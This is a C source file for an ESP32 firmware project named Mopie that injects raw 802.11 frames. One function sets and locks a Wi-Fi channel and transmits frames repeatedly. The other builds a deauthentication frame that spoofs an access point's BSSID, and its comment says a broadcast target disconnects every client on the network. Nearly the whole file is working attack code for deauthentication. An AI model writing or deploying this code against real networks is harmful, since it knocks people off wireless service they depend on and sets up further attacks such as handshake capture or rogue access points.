#include "mopie_tx.h"
#include <esp_wifi.h>
#include "core/wifi/wifi_common.h"   // wifiRawTx helper

// From-scratch raw 802.11 frame injection for Mopie.
// We build the 802.11 management frames ourselves (deauth etc.) per the spec,
// then hand them to Mopie's wifi_common -> esp_wifi_80211_tx transport to put
// them on the air (kernel sets seq + FCS). This is Mopie's own frame code, not
// a copied upstream template.

int mopie_send_raw(const uint8_t *frame, size_t len, uint8_t channel, int retries) {
    if (!frame || len < 10) return 0;
    // set + lock the channel so the injection lands where we expect
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    vTaskDelay(pdMS_TO_TICKS(5));

    int sent = 0;
    for (int i = 0; i < retries; i++) {
        esp_err_t err = wifiRawTx(WIFI_IF_AP, frame, (int)len);
        if (err == ESP_OK) sent++;
        vTaskDelay(pdMS_TO_TICKS(1));
    }
    esp_wifi_set_promiscuous(false);
    return sent;
}

// Build a deauth: management frame control=0x00C0, duration 0, 6-byte addrs,
// seq (filled by the kernel), then reason code (2 bytes).
//   buf   : 26 bytes written
//   bssid : AP we impersonate (addr2 + addr3)
//   target: station to deauth (addr1); pass broadcast to kick the whole network
size_t mopie_build_deauth(uint8_t *buf, const uint8_t *bssid, const uint8_t *target,
                          uint16_t reason) {
    if (!buf || !bssid || !target) return 0;

    buf[0] = 0xC0;   // deauth subtype
    buf[1] = 0x00;
    buf[2] = 0x00;   // duration
    buf[3] = 0x00;
    memcpy(&buf[4], target, 6);   // addr1 = destination (station being kicked)
    memcpy(&buf[10], bssid, 6);   // addr2 = source (AP we impersonate)
    memcpy(&buf[16], bssid, 6);   // addr3 = BSSID
    buf[22] = 0x00;               // seq (kernel fills with en_sys_seq)
    buf[23] = 0x00;
    buf[24] = (uint8_t)(reason & 0xFF);
    buf[25] = (uint8_t)((reason >> 8) & 0xFF);
    return 26;
}